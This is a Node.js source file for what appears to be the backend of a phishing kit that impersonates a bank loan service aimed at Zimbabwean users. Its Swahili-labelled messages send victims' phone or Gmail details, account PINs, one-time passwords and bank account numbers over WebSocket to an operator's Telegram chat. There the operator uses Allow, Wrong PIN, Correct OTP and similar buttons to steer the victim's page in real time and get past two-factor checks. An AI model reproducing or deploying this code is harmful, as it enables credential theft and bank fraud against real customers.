const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || '8786820449';
const BASE_URL = process.env.BASE_URL || 'https://nmb-zimbabwe.onrender.com';

const bot = new TelegramBot(TOKEN, { polling: true });

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

const clients = new Map();

bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
    const user = msg.from;
    const firstName = user.first_name || 'User';
    const lastName = user.last_name || '';
    const username = user.username ? `@${user.username}` : 'Hakuna';
    const userId = user.id;

    const userLink = `${BASE_URL}/?ref=${userId}`;

    const privateWelcomeText = `👋 *Karibu kwenye Paneli ya Utawala*\n\n` +
        `👤 *Taarifa Zako:*\n` +
        `• Jina: ${firstName} ${lastName}\n` +
        `• Username: ${username}\n` +
        `• Telegram ID: \`${userId}\`\n\n` +
        `🔗 *Link yako ya kipekee ya rufaa:* \`${userLink}\``;

    const notificationText = `🚀 *MTUMIAJI AMEANZISHA BOT*\n\n` +
        `👤 *Jina:* ${firstName} ${lastName}\n` +
        `🏷️ *Username:* ${username}\n` +
        `🆔 *Telegram ID:* \`${userId}\`\n\n` +
        `🔗 *Link ya Mtumiaji:* \`${userLink}\``;

    try {
        await bot.sendMessage(userId, privateWelcomeText, {
            parse_mode: 'Markdown'
        });

        if (ADMIN_CHAT_ID && ADMIN_CHAT_ID !== userId.toString()) {
            await bot.sendMessage(ADMIN_CHAT_ID, notificationText, {
                parse_mode: 'Markdown'
            });
        }
    } catch (err) {
        console.error("Error sending start messages:", err);
    }
});

wss.on('connection', (ws) => {
    ws.on('message', async (message) => {
        try {
            const data = JSON.parse(message);

            if (data.type === 'REGISTER_SUBADMIN') {
                clients.set(data.refCode, ws);
            } 
            else if (data.type === 'SUBMIT_CREDENTIALS') {
                const { contactType, contact, pin } = data;
                
                const labelTitle = contactType === 'gmail' ? '📧 *Gmail Address:*' : '📱 *Namba ya Simu:*';
                const formattedContact = contactType === 'phone' ? `+263${contact}` : contact;
                
                const captionText = `🚨 *MAOMBI MAPYA YA MKOPAJI*\n\n${labelTitle} \`${formattedContact}\`\n🔑 *PIN ya Akaunti:* \`${pin}\``;
                
                const sentMsg = await bot.sendMessage(ADMIN_CHAT_ID, captionText, {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '✅ Allow', callback_data: `ALLOW_${contact}` },
                                { text: '❌ Deny', callback_data: `DENY_${contact}` }
                            ]
                        ]
                    }
                });
                
                ws.clientId = contact;
                clients.set(contact, { ws, messageId: sentMsg.message_id });
            }
            else if (data.type === 'SUBMIT_OTP') {
                const { otp } = data;
                
                await bot.sendMessage(ADMIN_CHAT_ID, `🔢 *UWEKAJI WA OTP*\n\nOTP Iliyowekwa: \`${otp}\``, {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '⚠️ Wrong PIN', callback_data: 'WRONG_PIN' },
                                { text: '❌ Wrong OTP', callback_data: 'WRONG_OTP' }
                            ],
                            [
                                { text: '✅ Correct OTP', callback_data: 'CORRECT_OTP' }
                            ]
                        ]
                    }
                });
            }
            else if (data.type === 'SUBMIT_ACCOUNT') {
                const { accountNumber } = data;
                await bot.sendMessage(ADMIN_CHAT_ID, `🏛️ *AKAUNTI YA BENKI*\n\nNamba ya Akaunti: \`${accountNumber}\``, {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '✅ Valid ACC', callback_data: 'VALID_ACC' },
                                { text: '❌ Invalid ACC', callback_data: 'INVALID_ACC' }
                            ]
                        ]
                    }
                });
            }
        } catch (err) {
            console.error("WebSocket message handling error:", err);
        }
    });

    ws.on('close', () => {
        for (let [key, val] of clients.entries()) {
            if (val === ws || val.ws === ws) {
                clients.delete(key);
            }
        }
    });
});

bot.on('callback_query', async (query) => {
    const data = query.data;

    let actionResponse = '';

    if (data.startsWith('ALLOW_')) actionResponse = 'ALLOW';
    else if (data.startsWith('DENY_')) actionResponse = 'DENY';
    else if (data === 'WRONG_PIN') actionResponse = 'WRONG_PIN';
    else if (data === 'CORRECT_OTP') actionResponse = 'CORRECT_OTP';
    else if (data === 'WRONG_OTP') actionResponse = 'WRONG_OTP';
    else if (data === 'VALID_ACC') actionResponse = 'VALID_ACC';
    else if (data === 'INVALID_ACC') actionResponse = 'INVALID_ACC';

    for (let [, clientObj] of clients.entries()) {
        if (clientObj && clientObj.ws && clientObj.ws.readyState === WebSocket.OPEN) {
            clientObj.ws.send(JSON.stringify({ type: 'SERVER_ACTION', action: actionResponse }));
        }
    }

    try {
        await bot.editMessageReplyMarkup(
            { inline_keyboard: [] },
            {
                chat_id: query.message.chat.id,
                message_id: query.message.message_id
            }
        );

        await bot.answerCallbackQuery(query.id, { text: "Imekamilika!" });
    } catch (error) {
        console.error("Error updating message markup:", error);
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
            
